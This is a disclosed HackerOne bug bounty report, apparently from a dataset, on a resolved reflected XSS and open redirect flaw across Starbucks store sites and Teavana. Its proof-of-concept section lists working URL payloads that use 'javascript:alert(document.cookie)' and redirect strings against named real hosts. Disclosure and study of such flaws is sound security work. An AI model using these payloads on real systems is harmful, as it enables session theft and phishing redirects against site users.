---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '196846'
original_report_id: '196846'
title: Open redirect / Reflected XSS payload in root that affects all your sites (store.starbucks.*
  / shop.starbucks.* / teavana.com)
weakness: Cross-site Scripting (XSS) - Generic
team_handle: starbucks
created_at: '2017-01-09T09:04:56.079Z'
disclosed_at: '2017-06-14T19:38:58.447Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 16
asset_identifier: Other assets
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Open redirect / Reflected XSS payload in root that affects all your sites (store.starbucks.* / shop.starbucks.* / teavana.com)

## Metadata

- HackerOne Report ID: 196846
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: starbucks
- Disclosed At: 2017-06-14T19:38:58.447Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello, during some open redirects testing, I have noticed a very strange redirect that occured when I had modified a parameter using something like `>cofee`. I have digged up further and then I have noticed that one can make a redirect by modifying GET parameters with this structure : `<>//google.com`

There seems to be a stripping of tags and after that some chained redirect, that will eventually trigger an XSS vulnerability if the payload is like : `<>javascript:alert(document.cookie);`.

__So, based on this I have noticed that all your websites except the starbucks.* are vulnerable to an XSS payload that is written directly in the root URL or almost ANY other get parameter__, thus making almost all the websites exploitable with multiple injection points (starbucks.* seems not affected)

POC EXAMPLES
-------
```
https://shop.starbucks.de/<>javascript:alert(document.cookie);
https://teavana.com/<>javascript:alert(document.cookie);
https://store.starbucks.com/<>javascript:alert(document.cookie);
https://shop.starbucks.de/coffee/coffee,de_DE,sc.html?prefn1=decaffeinated&prefv1=<>javascript:alert('xss parameter');
https://shop.starbucks.de/coffee/coffee,de_DE,sc.html?prefn1=<>javascript:alert('xss parameter');
```

Bonus - open redirect example :
```
https://shop.starbucks.de/coffee/coffee,de_DE,sc.html?prefn1=decaffeinated&prefv1=<>//google.com
https://teavana.com/<>//google.com
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
